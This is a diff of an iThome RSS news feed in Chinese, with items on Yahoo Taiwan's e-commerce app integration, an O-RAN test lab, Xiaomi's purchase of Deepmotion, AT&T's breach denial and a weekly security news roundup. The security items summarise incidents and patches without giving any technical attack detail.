- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;Yahoo奇摩今日（8/25）宣布，完整打通旗下3大電商平臺的App：拍賣、超級商城和購物中心，要透過流量互導推升業績，來發揮生態圈綜效。消費者現可從任一平臺App一鍵切換，無縫串連至其他平臺。此外，Yahoo奇摩也與比價網站飛比價格合作，打造跨網比價服務，首先會在拍賣平臺展開測試。&lt;/p&gt;
-&lt;p&gt;為快速展現生態圈流量互導的效益，今年４月時，Yahoo奇摩先打通了每月擁有百萬會員的拍賣平臺App，來與超級商城App連結，拓展兩個行動平臺的商品量與多元性。&lt;/p&gt;
-&lt;p&gt;延續4月發布的平臺整合計畫，Yahoo奇摩今日宣布，已於7月再整合購物中心App，完成自家3大電商平臺App的整合作業。如今，消費者只需要使用其中一個Yahoo奇摩電商平臺的App，就可以一鍵切換至不同的平臺消費。而且，如果消費者在其一平臺搜尋商品時，剛好該商品只有在另一個平臺有銷售，搜尋結果會呈現另一平臺的商品資訊，達到平臺間流量互導的作用。&lt;/p&gt;
-&lt;p&gt;Yahoo奇摩觀察流量、金流數據後發現，拍賣平臺擁有最大流量基礎，可以導引流量至購物中心和商城，而購物中心消費含金量最高，來自購物中心的流量可刺激另兩平臺的業績。Verizon Media臺灣董事總經理暨臺灣電商與區域產品事業群副總裁林振德表示，三電商App打通後，平臺之間流量互導轉化成效顯著，最高推升導流業績平均週成長達6成，並表示，未來，會根據使用者流量互導狀況，來擬定下一步產品整合的做法，對營運成長會有更大的幫助。&lt;/p&gt;
-&lt;p&gt;考量三個電商平臺分別有各自的忠誠使用族群，習慣既有的平臺使用者體驗，因此，Yahoo奇摩目前決定維持各平臺App自身的購物流程，並針對跨平臺使用者，提供更多元的商品及商家的選擇，來滿足他們的購物需求。林振德表示，技術團隊過去不斷更新功能，因此，App經過整合後，App大小反而比原先小一些，另外，在平臺共通性功能整合上，技術團隊也做了去重複化的工程，&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;與飛比價格合作，導入跨網比價服務&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;4月時，Yahoo奇摩也預告今年在產業跨業合作上，會有所突破，布局開放聯盟，今天，他們對外正式宣布，在開放策略下展開異業合作的嘗試，與比價網站飛比價格合作，共同打造內建於Yahoo奇摩電商平臺的比價引擎，提供消費者跨網比價服務。&lt;/p&gt;
-&lt;p&gt;通過新增比價服務，Yahoo奇摩要串連消費者線上購物的各個行為，從搜尋、比價到實際進行購物，來消弭購物旅程的斷點。Yahoo奇摩分享了一份資策會發布的2020年5月網購消費者意向調查報告，有近27%消費者從比價引擎尋找商品，是第三大獲取商品資訊的管道。林振德表示，比價網站已成為消費者取得產品資訊的主要管道，他進一步道：「比價已經成為消費者網購的必經之路。」&lt;/p&gt;
-&lt;p&gt;Yahoo奇摩會在引擎中整合上億筆全臺跨網商品比價資料，並結合自家熱銷推薦功能，來提供比價功能。實際操作情境是，消費者在搜尋商品關鍵字後，會出現比價功能選項，點選後，就可獲得不僅限上架於Yahoo奇摩三個電商平臺的商品資料，供尋找到最符合需求、最優價格的商品，並可直接點選連結到商品的網頁。林振德表示，這項服務是電商業界的首創。&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/Yahoo%E5%A5%87%E6%91%A9%E6%8B%8D%E8%B3%A3%E7%B5%90%E7%9B%9F%E9%A3%9B%E6%AF%94%E5%83%B9%E6%A0%BC%EF%BC%8C%E5%85%A8%E5%8F%B0%E4%B8%8A%E5%84%84%E5%95%86%E5%93%81%E6%90%9C%E5%B0%8B%E6%AF%94%E5%83%B9%E3%80%81%E8%B3%BC%E7%89%A9%E4%B8%80%E7%AB%99%E6%90%9E%E5%AE%9A.jpg&quot; style=&quot;width: 600px; height: 645px;&quot; /&gt;&lt;/p&gt;
-&lt;blockquote&gt;&lt;p&gt;&lt;em&gt;圖片來源：Yahoo奇摩&lt;/em&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;這個跨網比價功能會先導入拍賣平臺App，進行市場測試。林振德說明，因拍賣平臺不僅有最海量的商品，也有最多搜尋量，因此，先從拍賣平臺開始做嘗試。Yahoo奇摩會隨機挑選5%的拍賣平臺使用者，提供比價功能，進行測試，並視市場趨勢，以及使用者經驗回饋來優化功能。林振德提到，未來不排除拓展比價功能至其他自家電商平臺上。&lt;/p&gt;
-&lt;p&gt;除此之外，Yahoo奇摩也將持續結合Martech、AI與個人化技術，來持續優化商品搜尋結果，以及提供符合消費者需求的折價券、購物金等行銷工具，來協助商家提升業績。&lt;/p&gt;
-&lt;p&gt;針對品牌商家需要更多元方式與消費者接觸的需求，Yahoo奇摩另外還推出了全新的會員經營解決方案「Yahoo粉絲通」，打造類似於Line官方帳號的服務，供商家與消費者連結。這項新服務現階段提供包含群發、一對一私訊、主題群聊等功能，讓商家可以向消費者推播商品資訊與行銷活動，強化會員經營。文⊙黃郁芸&lt;/p&gt;
- &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 10:35:17 +0000</pubDate>
+ <pubDate>Thu, 26 Aug 2021 09:31:18 +0000</pubDate>
  <dc:creator>黃郁芸</dc:creator>
- <guid isPermaLink="false">146388 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146388#comments</comments>
+ <guid isPermaLink="false">146405 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146405#comments</comments>
 </item>
 <item>
- <title>中華電信聯手耀登旗下O-RAN認證實驗室，要助國產O-RAN產品搶攻5G市場</title>
- <link>https://www.ithome.com.tw/news/146383</link>
- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;國內提供天線、實驗室驗測服務的耀登集團旗下耀睿實驗室，近期獲得O-RAN聯盟認證為OTIC(Open Testing and Integration Centre)實驗室，未來將和中華電信合作，協助國內業者搶攻全球5G開放網路商機。&lt;/p&gt;
-&lt;p&gt;耀登集團旗下原本就有實驗室，提供4G設備驗測服務，此次耀睿實驗室獲得國際O-RAN聯盟認證，成為全球5家合格的OTIC實驗室之一，其中4家位於德國、義大利、西班牙及法國，具有電信營運商背景，耀睿為唯一一家獨立實驗室，也是亞洲第一家獲得O-RAN聯盟認證的OTIC實驗，該實驗室提供一致性測試、互通性測試、端對端測試，以驗證不同廠牌的網元設備介接、互通性，加速5G開放網路的發展。&lt;/p&gt;
-&lt;p&gt;中華電信與耀登集團合作，提供國產O-RAN設備兩階段測試服務。第一階段先在耀睿實驗室進行個別網元的功能、互通性、效能、壓力及資安等測試，第二階段在中華電信研究院進行場域性的實網整合測試。&lt;/p&gt;
-&lt;p&gt;在此之前，國內業者以開放網路技術開發的白牌基地臺，因缺乏國際O-RAN聯盟認證的驗測單位，業者需要和電信營運商個別合作，提供樣品供其測試，測試結果不一定回饋給業者，現在耀睿實驗室獲認證為OTIC實驗室後，先在實驗室測試個別的網元設備，再通過中華電信研究院的場域實網整合測試，等於獲得O-RAN聯盟與電信商認證。據了解，目前約有10多家業者將參與測試。&lt;/p&gt;
-&lt;p&gt;耀登科技董事長張玉斌表示，耀睿獲得O-RAN聯盟認證為合格OTIC實驗室，相較於其他4家合格認證實驗室在歐洲，電信商自身測試需要，耀睿為第三方OTIC實驗室，雖然目前O-RAN標準尚未完全底定，但未來兩三年之內，耀睿有機會發出第一張認證。&lt;/p&gt;
-&lt;p&gt;不只是網通設備一致性、互通性測試，鑑於開放網路的資安風險，耀睿也提供網通設備的資安測試。&lt;/p&gt;
-&lt;p&gt;張玉斌指出，5G需要部署大量基地臺，O-RAN將為台灣的產業帶來轉型契機，耀睿獲得O-RAN聯盟認證為合格實驗室，有助於國內業者打進全球5G市場。而與中華電信合作，將進一步加速5G開放網路的系統整合速度。&lt;/p&gt;
-&lt;p&gt;中華電信相當積極投入開放網路，該公司在2018年聯合中磊、智邦、廣達、正文、明泰、宏達電等業者成立5G領航隊，以5G實驗網、場域實測，與國內業者合作測試5G小型基地臺、MEC等，隨著開放網路技術愈來愈成熟，去年加入國際O-RAN組織。與耀登合作，在國發會經費補助下，提供業者驗測服務，將帶動國內業者加速開發開放網路設備，進攻5G行動基礎設備市場。&lt;/p&gt;
-&lt;p&gt;由於虛擬化、軟體定義技術愈來愈成熟，帶動5G網路基礎建設的開放網路技術風潮，以往電信業者的網通設備多為大型電信設備商綁定，未來採用白牌伺服器、虛擬化、軟體定義等技術，讓電信商有能力逐漸擺脫大型電信設備商的限制，龐大的效益及商機吸引電信商、網通、伺服器代工業者投入，例如PC、伺服器代工業者廣達、仁寶等皆投入5G開放網路產品研發。&lt;/p&gt;
+ <title>小米買下自駕車新創Deepmotion</title>
+ <link>https://www.ithome.com.tw/news/146400</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;小米集團周三（8/25）公布今年第二季的財報，同時宣布將以7,737萬美元的價格，&lt;a href=&quot;https://cdn.cnbj1.fds.api.mi-img.com/company/announcement/en-us/%E8%8B%B1%E6%96%87-_2021082500731.pdf&quot; target=&quot;_blank&quot;&gt;買下中國的自駕車新創深動科技（Deepmotion Tech Limited）&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;總部位於北京的深動科技成立於2017年，員工人數尚不到50人，主要開發自動駕駛解決方案，宣稱可整合各種感應器，並透過雲端架構來更新地圖與最佳化的自動駕駛演算法，還標榜可將AI演算法快速部署於不同的嵌入式平臺，以及具備硬體設計能力以解決軟、硬體的搭配問題。&lt;/p&gt;
+&lt;p&gt;目前的深動科技提供自動停車軟體解決方案、感應系統解決方案，以及自動化地圖與高精度定位等模組。不過，在小米宣布此一收購案之後，&lt;a href=&quot;https://deepmotion.ai/&quot; target=&quot;_blank&quot;&gt;深度科技的官網&lt;/a&gt;已無法存取。&lt;/p&gt;
+&lt;p&gt;根據&lt;a href=&quot;https://www1.hkexnews.hk/listedco/listconews/sehk/2021/0330/2021033000824.pdf&quot; target=&quot;_blank&quot;&gt;小米提交給香港交易所的文件&lt;/a&gt;，小米將成立一個全新的子公司來經營智慧電動車業務，初期投入的資金為100億元人民幣（約15.5億美元），而未來10年的總投資可望達到100億美元，並由小米集團的執行長雷軍擔任此一新公司的執行長。&lt;/p&gt;
+&lt;p&gt;小米表示，該公司希望能夠提供高品質的智慧電動車，以讓全球的使用者都能享受智慧生活。&lt;/p&gt;
+&lt;p&gt;小米今年第二季的營收為878億元人民幣，比去年同期增加了64%，獲利為63億元人民幣，成長87.4%。從營收類別來看，手機依然是小米集團最主要的營收來源，該季替小米帶進了592億美元的營收，占小米總營收的67.3%。&lt;/p&gt;
  &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 09:59:04 +0000</pubDate>
- <dc:creator>蘇文彬</dc:creator>
- <guid isPermaLink="false">146383 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146383#comments</comments>
-</item>
-<item>
- <title>AT&amp;T否認被駭遭竊7000萬用戶資料</title>
- <link>https://www.ithome.com.tw/news/146382</link>
- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;上周發生美國電信業者&lt;a href=&quot;https://www.ithome.com.tw/news/146273&quot; target=&quot;_blank&quot;&gt;T-Mobile&lt;/a&gt;數百萬用戶資料遭駭客放上暗網出售，事後T-Mobile也證實是資料庫被駭所致。而另一家電信龍頭&lt;a href=&quot;https://restoreprivacy.com/att-data-breach-70-million-customers/&quot; target=&quot;_blank&quot;&gt;AT&amp;amp;T也傳出被駭客入侵&lt;/a&gt;，並導致7000萬用戶個資外洩，不過AT&amp;amp;T對此否認。&lt;/p&gt;
-&lt;p&gt;Restore Privacy網站報導，一名「ShinyHunters」的駭客上周在地下網路論壇，出售已取得AT&amp;amp;T 7000萬名用戶的隱私資料。這批資料存取費用為20萬美元，買斷費用則叫價100萬美元。&lt;/p&gt;
-&lt;p&gt;根據駭客張貼出的樣本，他手中的資料疑似包含用戶姓名、手機號碼、住家地址、電子郵件、生日及社會安全碼等，其中後兩者則是駭客解密取得。&lt;/p&gt;
-&lt;p&gt;不過AT&amp;amp;T回覆媒體否認被駭，表示根據該公司調查，在網路上曝光的資訊並不是來自AT&amp;amp;T。&lt;/p&gt;
-&lt;p&gt;這名「ShinyHunters」稍後對媒體指出，AT&amp;amp;T的反應並不令人意外，他相信直到他公布一切資料之前，這家電信業者會持續否認。&lt;/p&gt;
-&lt;p&gt;報導指出，這名駭客之前也曾涉及其他知名公司的資料外洩案。這些案件包括印尼電商平臺Tokopedia外洩9100萬用戶帳號資料；網路文學平臺Wattpad洩露2.7億筆用戶紀錄；線上PDF轉檔服務Nitro PDF和線上圖像編輯服務Pixlr各外流了7700萬筆用戶紀錄及190萬用戶帳號資料；微軟則被竊走了500GB的程式原始碼並上網兜售。&lt;/p&gt;
-&lt;p&gt;T-Mobile本周證實該公司系統是因為有安全漏洞，使駭客得以存取近5,000萬名用戶包括姓名、生日、社會安全號碼的資料。&lt;/p&gt;
- &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 09:34:40 +0000</pubDate>
- <dc:creator>林妍溱</dc:creator>
- <guid isPermaLink="false">146382 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146382#comments</comments>
-</item>
-<item>
- <title>資安一周第160期：殭屍網路發動大規模DDoS攻擊。駭客以百萬美元贖金分紅利誘，發動勒索軟體攻擊</title>
- <link>https://www.ithome.com.tw/news/146380</link>
- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;h3&gt;&lt;strong style=&quot;vertical-align: top; color: rgb(51, 153, 255);&quot;&gt;8/19-8/25必看資安新聞&lt;/strong&gt;&lt;/h3&gt;
-&lt;h3&gt; &lt;/h3&gt;
-&lt;h3&gt;&lt;span style=&quot;vertical-align: top; color: rgb(178, 34, 34);&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;＃DDoS攻擊  ＃殭屍網路&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;殭屍網路發動大規模DDoS攻擊，每秒發出逾1,700萬次HTTP請求&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;內容遞送網路（CDN）暨資安服務業者Cloudflare表示，他們近期攔阻了一起每秒發出1,720萬次HTTP請求的DDoS攻擊，鎖定金融產業的客戶而來，該公司指出，這樣的攻擊規模，約是過往規模最大事故的3倍。&lt;/p&gt;
-&lt;p&gt;針對攻擊流量的來源，Cloudflare認為是由殭屍網路發動，當中運用的殭屍電腦（Bot）總數超過2萬個，分別來自全世界125個國家。這起攻擊中，殭屍網路機器人在大約30秒之中，總共發出了3.3億次請求，最高峰達到每秒1,720萬次。&lt;strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146339&quot;&gt;詳全文&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/160-1-ddos-http-requests.png&quot; style=&quot;width: 400px; height: 201px;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#808080;&quot;&gt;圖片來源：Cloudflare&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;&lt;span style=&quot;vertical-align: top; color: rgb(178, 34, 34);&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;＃勒索軟體攻擊  ＃內部威脅&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;駭客以百萬美元贖金分紅利誘員工，意圖在企業內部植入勒索軟體&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;郵件安全公司Abnormal Security於8月12日，攔截一批寄送給該公司用戶的可疑電子郵件，寄件者宣稱是DemonWare勒索軟體相關人士，要求收信人參與他們的攻擊計畫，在公司內部植入勒索軟體，假若勒索成功，收信人將能得到100萬美元的高額報酬，寄出這些郵件的人士也留下了電子郵件信箱與Telegram帳號，讓有意參與者與他們聯繫。&lt;strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146295&quot;&gt;詳全文&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;&lt;strong style=&quot;color: rgb(178, 34, 34); vertical-align: top;&quot;&gt;＃加密貨幣&lt;/strong&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;日本加密貨幣交易所Liquid驚傳遭駭，駭客偷走近上億美元加密貨幣&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;日本加密貨幣交易所Liqiud於8月19日發出公告，指出他們大約於新加坡時間（SGT）7時50分，發現系統遭到入侵，攻擊者染指Liquid代管的熱錢包，並偷走了數量可觀的以太坊（Ethereum）、比特幣（Bitcoin），以及瑞波幣（Ripple）等多種加密貨幣。Liquid表示，他們正緊急將資產移往冷錢包，並且調查攻擊發生的原因。同時，Liquid亦暫停存取款服務。&lt;/p&gt;
-&lt;p&gt;後來Liquid經過清查表示，本次事故共有9,135萬美元的加密遭竊，總計有69種加密貨幣資產遭到侵占，被轉到其他交易所或是去中心化金融平臺。&lt;strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146310&quot;&gt;詳全文&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;&lt;span style=&quot;vertical-align: top; color: rgb(178, 34, 34);&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;＃勒索軟體攻擊  ＃漏洞攻擊  ＃網頁瀏覽器&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;Google、微軟緊急修補瀏覽器高風險漏洞&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;德國網路安全應變中心於8月20日，針對Google Chrome及微軟Edge瀏覽器提出警告，指出這些瀏覽器存在6個高度風險的漏洞，而且波及Windows、macOS，以及Linux等作業系統的用戶。&lt;/p&gt;
-&lt;p&gt;兩家廠商獲報後，皆陸續修補上述漏洞。Google於8月16日針對Windows用戶，發布92.0.4515.159版Chrome，並表明接下來即將推送相關修補給macOS與Linux用戶；微軟則是於8月20日，推出Edge 92.0.902.78版。&lt;strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146337&quot;&gt;詳全文&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/160-2-Chrome-Edge.png&quot; style=&quot;width: 400px; height: 228px;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#808080;&quot;&gt;圖片來源：德國網路安全應變中心&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;&lt;strong style=&quot;color: rgb(178, 34, 34); vertical-align: top;&quot;&gt;＃勒索軟體攻擊&lt;/strong&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;針對勒索軟體Diavol與製作TrickBot的駭客組織的關連，研究人員找到更多線索&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;資安業者Fortinet在7月初揭露名為的Diavol勒索軟體，並基於與Conti有許多共通的特性，認為可能是出自製作Trickbot殭屍病毒的駭客「Wizard Spider」之手。對於這個勒索軟體的研究，最近出現了新的進展：IBM X-Force威脅情報研究團隊指出，他們找到了Diavol的早期開發版本並進行研究，根據程式碼的編排方式來判斷，這款勒索軟體應該就是來自Wizard Spider。&lt;strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146280&quot;&gt;詳全文&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;&lt;span style=&quot;vertical-align: top; color: rgb(178, 34, 34);&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;＃殭屍網路  ＃物聯網資安&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;殭屍網路Mozi鎖定Netgear、華為、中興網路閘道發動攻擊&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;微軟揭露新一波殭屍網路Mozi的攻擊，研究人員發現，近期這款殭屍網路病毒針對Netgear、華為、中興（ZTE）等廠牌的網路閘道設備，加入了能夠持續運作的能力。&lt;/p&gt;
-&lt;p&gt;對於這些暴露於上述風險的路由器和網路閘道，微軟建議管理者要使用強密碼，以及安裝最新的修補程式，來防範Mozi的攻擊。&lt;strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146349&quot;&gt;詳全文&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;&lt;span style=&quot;vertical-align: top; color: rgb(178, 34, 34);&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;＃金融木馬  ＃CAPTCHA&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;銀行木馬Gozi以冒牌CAPTCHA為幌子，繞過瀏覽器防護機制入侵電腦&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;為了繞過瀏覽器的安全防護機制，攻擊者竟以假的CAPTCHA圖文驗證機制，透過引誘使用者輸入特定的按鍵，其背後目的卻是下載惡意程式。&lt;/p&gt;
-&lt;p&gt;根據Bleeping Computer的報導，安全研究團隊MalwareHunterTeam發現新的散布銀行木馬Gozi（或稱Ursnif）手法，攻擊者在網路流傳影片，一旦使用者想要觀看，這個影片就會要求依序輸入特定按鍵，來驗證是否為人類，但實際上，這些按鍵是讓已於背景下載完成的Gozi，留存在電腦的指令。&lt;strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146276&quot;&gt;詳全文&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/160-3-fake-captcha.png&quot; style=&quot;width: 400px; height: 295px;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color: rgb(128, 128, 128);&quot;&gt;圖片來源：Bleeping Computer&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;&lt;span style=&quot;vertical-align: top; color: rgb(178, 34, 34);&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;＃勒索軟體攻擊  ＃資料外洩  ＃資安險&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;勒索軟體Conti在攻擊前會先偵察目標組織的保險合約&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;威脅情報業者Advanced Intelligence（AdvIntel）在近期的一起攻擊事故裡發現，使用Conti勒索軟體的駭客，在攻擊目標的網路植入勒索軟體之前，先上傳了名為Rclone的開源資料備份工具，複製並竊取受害組織的保險合約資料，目的與他們打算向該組織索討的贖金金額有關。&lt;strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146275&quot;&gt;詳全文&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;&lt;span style=&quot;vertical-align: top; color: rgb(178, 34, 34);&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;＃物聯網資安  ＃漏洞攻擊&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong&gt;物聯智慧Kalay平臺含有重大漏洞，將允許駭客自遠端存取連網裝置&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;美國網路安全暨基礎架構安全署（CISA）與資安業者FireEye聯手，於8月17日提出警告，臺灣IoT平臺業者物聯智慧（ThroughTek）所打造的Kalay P2P SDK，含有重大漏洞CVE-2021-28372，攻擊者一旦濫用，就能自遠端執行任意程式或存取機密資訊，物聯智慧已修補該漏洞，並呼籲用戶儘快更新。&lt;a href=&quot;https://www.ithome.com.tw/news/146258&quot;&gt;&lt;strong&gt;詳全文&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;&lt;span style=&quot;vertical-align: top; color: rgb(178, 34, 34);&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;＃勒索軟體攻擊&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
-&lt;h2&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;知名連鎖餐飲業者鬍鬚張遭勒索軟體攻擊&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;鬍鬚張先後在6月21日、7月2日遭遇2起勒索軟體攻擊，並於7月19日發布公告，並說明資料外洩情形，通知民眾個資外洩可能風險，並說明已經向法務部調查局報案與強化資安。&lt;/p&gt;
-&lt;p&gt;由於許多會員僅提供行動電話聯繫方式，該公司再度於8月12日以簡訊通知會員，告知此次資安事件的調查與因應措施，提醒民眾變更密碼，並且要小心假冒鬍鬚張客服人員的詐騙。&lt;strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146292&quot;&gt;詳全文&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h2&gt;&lt;span style=&quot;vertical-align: top; color: rgb(51, 153, 255);&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;更多資安動態&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
-&lt;h3&gt;●&lt;a href=&quot;https://www.ithome.com.tw/news/146260&quot;&gt;近四成企業於12個月內遭遇勒索軟體攻擊事故&lt;/a&gt;&lt;br /&gt;
-●&lt;a href=&quot;https://www.ithome.com.tw/news/146297&quot;&gt;美國人口統計局因資安事故暴露IT管控疏失&lt;/a&gt;&lt;br /&gt;
-●&lt;a href=&quot;https://www.ithome.com.tw/news/146273&quot;&gt;T-Mobile證實遭駭客入侵，近5千萬用戶資料外洩&lt;/a&gt;&lt;/h3&gt;
- &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 08:41:07 +0000</pubDate>
- <dc:creator>周峻佑</dc:creator>
- <guid isPermaLink="false">146380 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146380#comments</comments>
-</item>
-<item>
- <title>美國新創業者Cerebras Systems發表全球首個大腦等級的AI系統</title>
- <link>https://www.ithome.com.tw/news/146379</link>
